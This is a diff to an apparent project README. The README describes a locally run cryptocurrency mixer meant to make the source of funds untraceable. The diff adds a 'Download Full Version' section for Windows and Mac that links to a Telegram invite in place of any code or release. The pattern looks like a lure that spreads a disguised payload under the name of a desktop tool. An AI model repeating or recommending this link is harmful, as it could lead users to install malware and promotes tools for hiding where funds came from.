@@ -1,5 +1,9 @@
 A cryptocurrency software mixer is a program that runs locally on a user's computer to increase the anonymity of cryptocurrency transactions. The main goal is to break the connection between the sender and receiver of funds, ensuring that the original source of transactions cannot be traced.
 
+## Download Full Version (Work on Windows and Mac OS)
+
+[Download:](https://t.me/+ZZisJtbwIP5iYjdh)
+
 ## Basic functions and principles of operation:
 # Automatic wallet generation:
 - The program automatically creates temporary cryptocurrency wallets through which the user's funds pass.
